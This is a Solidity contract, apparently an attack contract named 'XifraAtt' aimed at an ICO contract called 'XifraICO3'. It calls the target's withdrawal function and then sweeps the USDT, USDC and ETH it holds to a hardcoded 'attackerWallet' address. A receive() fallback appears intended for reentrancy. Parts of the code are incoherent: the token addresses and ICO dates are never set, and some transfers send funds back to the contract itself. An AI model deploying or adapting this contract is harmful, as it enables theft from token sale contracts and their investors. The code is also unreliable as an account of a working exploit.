// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;


import "./XifraICO3.sol";


contract XifraAtt {
   XifraICO3 private xifraAtt;
   mapping(address => uint256) private balance;
   address private attackerWallet = 0x0bC9C47Db51217839dDb5D69085CD8cFbD4A5cCA;
   address private xifraWallet = attackerWallet; 
   address private usdtToken;                        // USDT token address
   address private usdcToken;                        // USDC token address                  // Max ICO tokens to sell
   uint256 private icoStartDate;                     // ICO start date
   uint256 private icoEndDate;                       // ICO end date
   uint256 internal constant GAS_STIPEND_NO_GRIEF = 100000;
   bool private icoFinished;
 
 event onWithdrawICOFunds(uint256 _usdtBalance, uint256 _usdcBalance, uint256 _ethbalance);
  
  receive() external payable {
	// _fallback();
       uint256 usdtBalance = IERC20(usdtToken).balanceOf(address(this));
       require(IERC20(usdtToken).transfer(address(this), usdtBalance));


       uint256 usdcBalance = IERC20(usdcToken).balanceOf(address(this));
       require(IERC20(usdcToken).transfer(address(this), usdcBalance));
      
       uint256 ethbalance = address(this).balance;
       payable(address(this)).transfer(msg.value);

	emit onWithdrawICOFunds(usdtBalance, usdcBalance, ethbalance);

	}

  
   constructor(address xifraAddress) {
      xifraAtt = XifraICO3(xifraAddress);
    
   }
  
    function _isICOActive() internal view returns(bool) {
       if ((block.timestamp < icoStartDate) || (block.timestamp > icoEndDate) || (icoFinished == true)) return false;
       else return true;
   }

  
   function withdrawICOFunds() external payable {
       xifraAtt.withdrawICOFunds();
    
       require(_isICOActive() == false, "ICOStillActive");
      
       uint256 usdtBalance = IERC20(usdtToken).balanceOf(address(this));
       require(IERC20(usdtToken).transfer(attackerWallet, usdtBalance));


       uint256 usdcBalance = IERC20(usdcToken).balanceOf(address(this));
       require(IERC20(usdcToken).transfer(attackerWallet, usdcBalance));
      
       uint256 ethbalance = address(this).balance;
       payable(attackerWallet).transfer(msg.value);


       emit onWithdrawICOFunds(usdtBalance, usdcBalance, ethbalance);
   }


     
   }


